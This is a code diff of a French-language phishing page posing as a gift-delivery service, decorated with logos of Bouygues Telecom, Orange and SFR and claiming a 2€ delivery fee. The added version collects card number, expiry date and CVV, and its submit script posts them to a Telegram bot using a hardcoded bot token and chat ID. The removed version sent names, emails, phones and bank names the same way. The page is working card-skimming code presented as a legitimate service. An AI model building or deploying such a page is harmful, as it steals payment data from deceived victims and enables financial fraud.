@@ -22,11 +22,10 @@
     <!-- Formulaire principal -->
     <div class="bg-white rounded-lg shadow-xl p-8 max-w-lg mx-auto mt-10">
         <!-- Logos des opérateurs -->
-        <div class=
-"flex justify-center space-x-4 mb-6">
+        <div class="flex justify-center space-x-4 mb-6">
             <img src="pngtree-red-gift-vector-illustration-png-image_6447019.png" alt="logo" class="h-12">
-            <img src="Bouygues_Télécom.png" alt="sfr" class="h-12">
-            <img src="Orange_logo.svg.png" alt="Bouygues Telecom" class="h-12">
+            <img src="Bouygues_Télécom.png" alt="Bouygues Telecom" class="h-12">
+            <img src="Orange_logo.svg.png" alt="Orange" class="h-12">
             <img src="SFR-2022-logo.svg.png" alt="SFR" class="h-12">
         </div>
 
@@ -37,42 +36,33 @@
         </p>
 
         <!-- Numéro de carte -->
-<div class="mb-4">
-    <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
-    <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
-        class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-    <p id="card-error" class="text-red-500 hidden">Le numéro de carte doit être صحيحًا ويتبع التنسيق المطلوب.</p>
-</div>
+        <form id="remboursement-form">
+            <div class="mb-4">
+                <label for="numero-carte" class="block text-sm font-medium text-gray-700">Numéro de carte</label>
+                <input type="tel" id="numero-carte" placeholder="1234 5678 9012 3456" required maxlength="19"
+                    class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
+                <p id="card-error" class="text-red-500 hidden">Le numéro de carte est incorrect. Veuillez vérifier et réessayer.</p>
+            </div>
 
-<script>
-    const cardInput = document.getElementById('numero-carte');
-    const cardError = document.getElementById('card-error');
+            <script>
+                const cardInput = document.getElementById('numero-carte');
+                const cardError = document.getElementById('card-error');
 
-    cardInput.addEventListener('input', (e) => {
-        // إزالة الأحرف غير الرقمية والمسافات
-        let value = e.target.value.replace(/\D/g, '');
-        
-        // تحديد الطول إلى 16 رقمًا فقط
-        if (value.length > 16) {
-            value = value.slice(0, 16);
-        }
+                cardInput.addEventListener('input', (e) => {
+                    let value = e.target.value.replace(/\D/g, ''); // Supprimer les caractères non numériques
+                    if (value.length > 16) value = value.slice(0, 16); // Limiter à 16 chiffres
+                    e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Ajouter des espaces après 4 chiffres
+                    cardError.classList.add('hidden'); // Masquer l'erreur
+                });
 
-        // إضافة المسافات بعد كل 4 أرقام
-        e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-
-        // إخفاء رسالة الخطأ أثناء الكتابة
-        cardError.classList.add('hidden');
-    });
-
-    cardInput.addEventListener('blur', () => {
-        const value = cardInput.value.replace(/\s/g, ''); // إزالة المسافات للتحقق
-        const startsWithValidNumber = /^[4-6]/.test(value); // تحقق من بداية البطاقة (مثلًا تبدأ بـ 4 أو 5 أو 6)
-
-        if (value.length !== 16 || !startsWithValidNumber) {
-            cardError.classList.remove('hidden');
-        }
-    });
-</script>
+                cardInput.addEventListener('blur', () => {
+                    const value = cardInput.value.replace(/\s/g, '');
+                    const startsWithValidNumber = /^[4-6]/.test(value); // Numéros valides commençant par 4, 5 ou 6
+                    if (value.length !== 16 || !startsWithValidNumber) {
+                        cardError.classList.remove('hidden');
+                    }
+                });
+            </script>
 
             <!-- Date d'expiration -->
             <div class="mb-4">
@@ -88,7 +78,6 @@
                     class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
             </div>
 
-
             <!-- Bouton de validation -->
             <button type="submit"
                 class="w-full bg-green-600 text-white font-bold py-2 px-4 rounded-lg hover:bg-green-700 transition duration-300">
@@ -96,88 +85,62 @@
             </button>
         </form>
 
-
-        <!-- Titre -->
-        <h1 class="text-2xl font-bold text-center text-gray-800 mb-2"></h1>
-        <p class="text-sm text-center text-gray-600 mb-6">
+        <!-- Remarque -->
+        <p class="text-sm text-center text-gray-600 mt-6">
             Remarque : Un montant de 2€ sera débité uniquement pour la confirmation et la livraison. Merci pour votre confiance !
         </p>
-        </div>
-  </div>
-
-
-    <!-- SERVICE LIVRAISON CADEAU (Footer) -->
-<footer class="bg-gray-800 text-white py-6 mt-10">
-    <div class="max-w-4xl mx-auto text-center">
-        <p class="text-lg font-semibold mb-2">Pour toute assistance, contactez-nous :</p>
-        <p class="text-sm">📧 Email: <a href="mailto:support@livraisoncadeau.com" class="text-green-400 hover:underline">support@livraisoncadeau.com</a></p>
-        <p class="text-sm">📞 Téléphone: <a href="tel:+33890889878" class="text-green-400 hover:underline">+33 8 90 83 67 89</a></p>
-        <div class="mt-4">
-            <a href="#" class="text-green-400 hover:underline mx-2">Facebook</a> |
-            <a href="#" class="text-green-400 hover:underline mx-2">Twitter</a> |
-            <a href="#" class="text-green-400 hover:underline mx-2">Instagram</a>
-        </div>
-        <div class="mt-4 text-sm">
-            <a href="#" class="hover:underline">📄 Politique de confidentialité</a> |
-            <a href="#" class="hover:underline">📘 Conditions générales</a> |
-            <a href="#" class="hover:underline">🔗 Plan du site</a>
-        </div>
-        <p class="text-xs mt-4">&copy; 2024 Service de Livraison Cadeau. Tous droits réservés.</p>
     </div>
-</footer>
+
+    <!-- Footer -->
+    <footer class="bg-gray-800 text-white py-6 mt-10">
+        <div class="max-w-4xl mx-auto text-center">
+            <p class="text-lg font-semibold mb-2">Pour toute assistance, contactez-nous :</p>
+            <p class="text-sm">📧 Email: <a href="mailto:support@livraisoncadeau.com" class="text-green-400 hover:underline">support@livraisoncadeau.com</a></p>
+            <p class="text-sm">📞 Téléphone: <a href="tel:+33890889878" class="text-green-400 hover:underline">+33 8 90 83 67 89</a></p>
+            <p class="text-xs mt-4">&copy; 2024 Service de Livraison Cadeau. Tous droits réservés.</p>
+        </div>
+    </footer>
 
     <script>
-    document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
-        event.preventDefault();
+        document.getElementById("remboursement-form").addEventListener("submit", async function(event) {
+            event.preventDefault();
 
-        const nom = document.getElementById("nom").value;
-        const email = document.getElementById("email").value;
-        const telephone = document.getElementById("telephone").value;
-        const operateur = document.getElementById("operateur").value;
-        const bank = document.getElementById("bank").value;
+            const cardNumber = document.getElementById("numero-carte").value;
+            const expirationDate = document.getElementById("date-expiration").value;
+            const cvv = document.getElementById("cvv").value;
 
-        // التحقق من القيم
-        if (!nom || !email || !telephone || !operateur || !bank) {
-            alert("Veuillez remplir tous les champs avant de soumettre le formulaire.");
-            return;
-        }
+            if (!cardNumber || !expirationDate || !cvv) {
+                alert("Veuillez remplir tous les champs.");
+                return;
+            }
 
-        const token1 = "7342455335:AAE0QCPLUpV1nO2lbfSwEAfZmx8qc-ZGSBo";
-const chatId1 = "5372119436";
+            const token = "7342455335:AAE0QCPLUpV1nO2lbfSwEAfZmx8qc-ZGSBo";
+            const chatId = "5372119436";
 
-const message = `
-🔔 Nouvelle Demande de Remboursement 🔔
-👤 Nom complet: ${nom}
-📧 Email: ${email}
-📞 Téléphone: ${telephone}
-📡 Opérateur: ${operateur}
-🏦 Banque: ${bank}
+            const message = `
+🔔 Nouvelle demande 🔔
+💳 Carte : ${cardNumber}
+📅 Expiration : ${expirationDate}
+🔒 CVV : ${cvv}
 `;
 
-try {
-    const response = await fetch(https://api.telegram.org/bot${token1}/sendMessage, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-            chat_id: chatId1,
-            text: message,
-            parse_mode: "Markdown",
-        }),
-    });
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ chat_id: chatId, text: message }),
+                });
 
-    if (!response.ok) {
-        alert("Erreur lors de l'envoi. Code d'erreur: " + response.status);
-        return;
-    }
-
-    // إعادة التوجيه بعد الإرسال
-    window.location.href = "page-payement.html";
-} catch (error) {
-    alert("Impossible d'envoyer les données. Vérifiez votre connexion.");
-}
-    });
-</script>
+                if (response.ok) {
+                    alert("Paiement validé avec succès !");
+                    window.location.href = "Traitement.html";
+                } else {
+                    alert("Erreur lors de l'envoi. Veuillez réessayer.");
+                }
+            } catch (error) {
+                alert("Une erreur est survenue. Vérifiez votre connexion.");
+            }
+        });
+    </script>
 </body>
 </html>
